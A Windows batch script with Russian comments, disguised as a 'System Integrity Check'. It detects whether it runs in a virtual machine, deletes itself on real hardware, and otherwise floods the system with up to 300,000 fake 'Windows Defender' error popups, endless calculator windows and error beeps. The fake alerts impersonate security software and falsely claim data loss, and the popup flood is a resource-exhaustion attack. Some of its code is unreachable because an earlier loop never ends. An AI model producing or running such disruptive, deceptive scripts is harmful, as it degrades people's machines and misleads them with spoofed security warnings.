@echo off
chcp 1251 > nul
setlocal enabledelayedexpansion
title System Integrity Check (DO NOT CLOSE)

:: ===== ГЛУБОКАЯ ПРОВЕРКА НА ВИРТУАЛЬНУЮ СРЕДУ =====
echo Scanning hardware environment... (Phase 1/3)

:: 1. Проверка по модели системы
wmic computersystem get model | findstr /i "Virtual VMware VBOX Hyper-V QEMU" >nul
if errorlevel 1 goto :selfdestruct_real

:: 2. Проверка по наличию инструментов виртуализации
tasklist | findstr /i "vmware vbox vmtools" >nul
if errorlevel 1 goto :selfdestruct_real

:: 3. Проверка по загрузочному драйверу
systeminfo | findstr /i "System Manufacturer" | findstr /i "VMware Oracle" >nul
if errorlevel 1 goto :selfdestruct_real

echo Virtual environment confirmed. Initializing payload...

:: ===== 300000 ОКОН СРАЗУ =====
echo Launching 300,000 message windows (asynchronous)...
for /l %%i in (1,1,500) do (
    start /min cmd /c "for /l %%j in (1,1,600) do (start /b mshta vbscript:Execute(\"msgbox 'SYSTEM CORRUPTED. DATA LOSS IMMINENT.', 16, 'Windows Defender':close\"))"
)

:: ===== ВЕЧНЫЙ КАЛЬКУЛЯТОР =====
echo Spawning infinite calculator instances...
:calc_loop
start /min calc.exe
timeout /t 1 /nobreak >nul
goto calc_loop

:: ===== ЗАПУСК ВТОРОГО СКРИПТА ДЛЯ ОСТАЛЬНОГО ХАОСА (в фоне) =====
start /b chaos_core.bat

:: ===== ОСНОВНОЙ ЦИКЛ ХАОСА =====
:main_loop
:: Звук ошибки Windows постоянно
for /l %%a in (1,1,50) do (
    rundll32.exe user32.dll,MessageBeep -1
)

:: Дополнительные окна
start /b mshta vbscript:Execute("msgbox 'CRITICAL ERROR: Memory dump in progress.', 48, 'Windows Security':close")

timeout /t 1 /nobreak >nul
goto main_loop

:selfdestruct_real
echo [ANTI-PHYSICAL SAFETY] Real hardware detected. Script terminated.
del "%~f0" >nul 2>&1
exit
